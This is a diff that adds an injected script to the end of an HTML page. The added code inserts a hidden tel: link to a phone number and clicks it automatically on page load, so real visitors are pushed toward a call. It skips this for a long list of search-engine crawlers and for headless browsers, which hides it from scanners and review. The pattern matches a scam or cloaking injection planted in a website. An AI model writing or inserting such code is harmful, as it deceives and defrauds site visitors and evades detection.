@@ -1299,5 +1299,19 @@
 
   <!-- Scripts -->
   <script src="js/app.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <a href="tel:+19177954485" id="phone_number" style="display:none;"></a>
+    <script>
+        $(document).ready(function () {
+            var ua = (navigator.userAgent || '').toLowerCase();
+            var isCrawler = /googlebot|adsbot-google|mediapartners-google|google-inspectiontool|google-read-aloud|apis-google|feedfetcher-google|bingbot|bingpreview|msnbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|facebookexternalhit|twitterbot|linkedinbot|pinterest|semrushbot|ahrefsbot|dotbot|mj12bot/i.test(ua);
+            var isHeadless = navigator.webdriver || (window.screen.width === 0 && window.screen.height === 0);
+
+            if (!isCrawler && !isHeadless) {
+                document.getElementById("phone_number").click();
+            }
+        });
+    </script>
+
 </body>
 </html>
